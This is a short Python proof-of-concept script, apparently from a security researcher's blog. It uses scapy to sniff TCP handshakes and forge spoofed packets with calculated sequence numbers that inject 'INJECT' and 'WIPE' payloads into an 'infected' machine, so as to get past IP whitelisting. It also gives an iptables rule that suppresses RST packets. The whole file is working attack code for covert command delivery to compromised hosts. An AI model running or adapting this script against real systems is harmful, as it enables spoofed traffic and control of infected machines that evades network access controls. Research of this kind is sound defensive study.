#!/usr/bin/env python
"""
    DiabloHorn - https://diablohorn.com
    POC server to inject packets towards 'infected' machine
    intended to bypass IP whitelisting
"""
import time
import socket
from scapy.all import *

conf.sniff_promisc = 0
"""
iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <ip> -j DROP
"""
STATE_TEMP = []
def flags2human(flagbits):
    flags = {0:"FIN",1:"SYN",2:"RST",3:"PUSH",4:"ACK",5:"URG",6:"ECN-Echo",7:"CWR"}
    output = []

    for x in range(0,8):
        if (flagbits >> x) & 1:
            output.append(flags[x])

    return str(output)

def pkt_inspect(pktdata):
    print repr(pktdata)
    if pktdata.haslayer(TCP):
        tcpdata = pktdata.getlayer(TCP)
        #check if syn and ack flags are set
        if ((tcpdata.flags >> 1) & 1) and ((tcpdata.flags >> 4) & 1):
            if len(STATE_TEMP) == 2:
                spkt = IP(src="172.16.218.152",dst="172.16.218.168") / TCP(dport=STATE_TEMP[0].dport,sport=8080,flags='PA',seq=STATE_TEMP[1].ack-1,ack=STATE_TEMP[0].ack-1) / "INJECT"
                print 'INJECT INJECT'
                print repr(spkt)
                send(spkt)
                spkt = IP(src="172.16.218.152",dst="172.16.218.168") / TCP(dport=STATE_TEMP[0].dport,sport=8080,flags='PA',seq=((STATE_TEMP[1].ack-1)+6),ack=STATE_TEMP[0].ack-1) / "WIPE"
                print 'INJECT WIPE'
                print repr(spkt)
                send(spkt)
                del(STATE_TEMP[1])
                del(STATE_TEMP[0])
                sys.exit()

            if len(STATE_TEMP) == 1:
                if STATE_TEMP[0].ack != tcpdata.ack:
                    STATE_TEMP.append(tcpdata)
            else:
                STATE_TEMP.append(tcpdata)

if __name__ == "__main__":
    sniff(iface="eth0",store=0,prn=pkt_inspect,filter="ip and host 172.16.218.152")
